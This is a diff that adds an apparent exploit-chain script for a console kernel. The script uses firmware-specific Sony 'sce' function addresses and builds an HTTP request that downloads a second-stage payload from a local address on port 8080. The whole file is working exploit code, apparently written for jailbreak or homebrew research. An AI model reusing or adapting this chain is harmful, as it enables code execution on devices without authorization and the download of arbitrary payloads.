@@ -1,0 +1,48 @@
+%(set_data_base(0x812C0000))s
+
+data
+{
+    func infloop = 0x89C00A4F;
+    func svc = 0x89ED8CC0;
+
+    func sceHttpCreateTemplate = 0x89ED84DC;
+    func sceHttpCreateConnectionWithURL = 0x89ED859C;
+    func sceHttpCreateRequestWithURL = 0x89ED857C;
+    func sceHttpSendRequest = 0x89ED853C;
+    func sceHttpReadData = 0x89ED851C;
+    func sceKernelAllocMemBlock = 0xE000B0BC;
+    func sceKernelGetMemBlockBase = 0xE000B0AC;
+
+    func sceKernelCreateThread = 0xE000B03D;
+    func sceKernelStartThread = 0xE000AAD9;
+
+    func sceKernelDelayThread = 0x89ED8C4C;
+
+    func memset = 0x810E20E1;
+    func memcpy = 0x810E1EA9;
+
+    symbol HTTP_HANDLE = %(writes("AAAAAAAA"))s;
+    symbol STAGE2_URL = %(writes("http://192.168.2.1:8080/"))s;
+    symbol HTTPBUF_ADDR = 0x812B0000;
+}
+
+code : entry
+{
+    $writedata$
+
+    sceKernelDelayThread(2 * 1000 * 1000); // wait 2s for kernel thread to do its thing
+
+    sceHttpCreateTemplate(
+        %(writes("aaa"))s /*useragent*/,
+        2 /*http_ver*/,
+        1 /*auto_proxy*/);
+
+    sceHttpCreateConnectionWithURL(RET, STAGE2_URL, 0);
+    sceHttpCreateRequestWithURL(RET, 1, STAGE2_URL, 0, 0, 0x10000);
+    storeret(HTTP_HANDLE);
+
+    loadret(HTTP_HANDLE);
+    sceHttpSendRequest(RET, HTTPBUF_ADDR, 0x100);
+
+    infloop(0);
+}
